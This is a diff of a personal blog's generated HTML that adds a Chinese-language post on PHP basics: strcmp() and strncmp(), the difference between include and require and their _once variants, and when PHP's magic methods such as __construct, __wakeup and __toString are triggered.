+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/02/28/PHP1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/28/PHP1/" class="post-title-link" itemprop="url">PHP strcmp（）函数 引入文件语句的区别 魔术方法</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-28 16:46:26 / 修改时间：17:00:19" itemprop="dateCreated datePublished" datetime="2019-02-28T16:46:26+08:00">2019-02-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PHP基础/" itemprop="url" rel="index"><span itemprop="name">PHP基础</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、strcmp（）函数"><a href="#一、strcmp（）函数" class="headerlink" title="一、strcmp（）函数"></a>一、strcmp（）函数</h2><p>1、strcmp（）的作用是比较2个字符串（区分大小写）<br><img src="/2019/02/28/PHP1/20190228134321111.jpg" alt="在这里插入图片描述"><br>2、基本语法：</p>
+<pre><code>stcmp(string1,string2)//string1和2进行比较
+</code></pre><p>3、技术细节：<br>如果返回值为0,2个字符串相等<br><img src="/2019/02/28/PHP1/2.jpg" alt="在这里插入图片描述"><br>如果返回值小于0,string1小于string2<br>如果返回值大于0,string1大于string2<br><img src="/2019/02/28/PHP1/3.jpg" alt="在这里插入图片描述"><br>注意的是，PHP版本得为4+</p>
+<p>该函数与stncmop()函数类似，不同的是，stncmop()函数可以指定字符串用于比较的字符数<br>基本语法：</p>
+<pre><code>strncmp(string1,string2,length)
+</code></pre><p>二、<br>include() 、require()语句包含并运行指定文件。这两结构在包含文件上完全一样，唯一的区别是对于错误的处理。require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。</p>
+<p>include(‘hello.php’); </p>
+<p>echo ‘include test final!’;//include报错，但是会继续执行，显示：include test final! </p>
+<p>require(‘hello.php’); </p>
+<p>echo ‘require test final!’;//require报错，停止代码的执行。</p>
+<h2 id="二、include-include-once-require-require-once-的区别"><a href="#二、include-include-once-require-require-once-的区别" class="headerlink" title="二、include, include_once, require, require_once 的区别"></a>二、include, include_once, require, require_once 的区别</h2><p>include 和 include_once 只有在 php 执行到该语句时才会执行文件包含的操作。其中，include在包含文件出错时会提示 warning, 但后续的代码仍会继续执行, iclude_once 不会重复包含同一文件;<br>require 和 require_once 在php文件执行前就把需要包含的文件的内容替换掉 require 语句本身, 所以在包含文件出错时会抛出error, 后续代码不会继续执行, require_once 也只执行一次包含操作.<br>下面这篇博客是教详细介绍了他们·的区别<br><a href="https://blog.csdn.net/j393819650/article/details/53836525" target="_blank" rel="noopener">https://blog.csdn.net/j393819650/article/details/53836525</a></p>
+<h2 id="三、魔术方法"><a href="#三、魔术方法" class="headerlink" title="三、魔术方法"></a>三、魔术方法</h2><p>具体的大家可以看<a href="http://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">php手册之魔术方法</a><br>这边就只是简单介绍下他们何时会触发</p>
+<p>1、<strong><code>__construct,</code>构造函数</strong>，具有构造函数的类会在每次创建新对象时先调用此方法（实例化对象时）</p>
+<p>2、<strong><code>__destruct</code>,解析函数</strong>，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。（类对象使用结束时自动调用）</p>
+<p>3、<strong>属性重载</strong><br>在给不可访问（未定义）属性赋值时，<code>__set()</code> 会被调用。</p>
+<p>读取不可访问（未定义）属性的值时，<code>__get()</code> 会被调用。</p>
+<p>当对不可访问（未定义）属性调用 <code>isset()</code> 或 <code>empty()</code> 时，__isset() 会被调用。</p>
+<p>当对不可访问（未定义）属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用。<br>注意的是：这些魔术方法的参数都不能通过引用传递</p>
+<p>4、<strong>方法重载</strong><br>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p>
+<p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用</p>
+<p>5、<code>__sleep()</code>,serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作</p>
+<p>6、 <code>__wakeup</code> ，与之相反，unserialize() 会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 </strong>wakeup 方法，预先准备对象需要的资源。<br>__wakeup() 经常用在反序列化操作中。</p>
+<p>7、<code>__toString()</code> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误</p>
+<p>注意！！！！不能在 __toString() 方法中抛出异常。这么做会导致致命错误。</p>
+<p>8、<code>__invoke()</code>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。<br>注意：在PHP5.3.0版本上才有效</p>
+<p>9、 <code>__set_state()</code>，自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。</p>
+<p>10、<code>__clone()</code>,当使用__clone()复制一个对象时候调用。</p>
+<p>11、<code>__debugInfo (  ) :</code>，在转储对象以获取应该显示的属性时，var_dump()调用此方法。如果方法没有在对象上定义，那么将显示所有公共、受保护和私有属性。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/02/27/postname/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -525,7 +1392,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-count">25</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -552,7 +1419,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">7</span>
+                      
+                    
+                    <span class="site-state-item-count">8</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
